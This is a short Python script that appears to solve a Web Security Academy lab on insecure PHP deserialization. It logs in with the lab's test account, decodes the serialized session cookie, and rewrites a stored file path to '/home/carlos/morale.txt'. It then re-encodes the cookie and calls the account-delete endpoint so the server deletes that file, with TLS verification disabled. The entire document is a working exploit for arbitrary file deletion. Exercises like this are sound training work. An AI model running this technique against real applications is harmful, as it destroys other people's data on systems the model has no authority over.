import urllib.parse
import base64
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# get cookie
url = "https://0a0700cb04c62c9ec090c0eb007000cc.web-security-academy.net/login"
values = {"username": "wiener", "password": "peter"}
r = requests.post(url, data=values, allow_redirects=False, verify=False)
cookie = r.cookies.get_dict()['session']


# base64, url encode and decode
url_decode = urllib.parse.unquote(cookie)
base64_d = base64.b64decode(url_decode)
deserialized = str(base64_d.decode())
access_token = re.sub(r'(s:19:"\w+/\w+/\w+")', 's:23:"/home/carlos/morale.txt"', deserialized)
print(access_token)
serial_base64_encode = base64.b64encode(bytes(access_token, encoding="utf-8"))
serial_url_encode = urllib.parse.quote_plus(serial_base64_encode)
print(serial_url_encode)
headers = {"cookie": "session="+serial_url_encode}


# exploit

r = requests.post("https://0a0700cb04c62c9ec090c0eb007000cc.web-security-academy.net/my-account/delete", headers=headers, allow_redirects=False, verify=False)
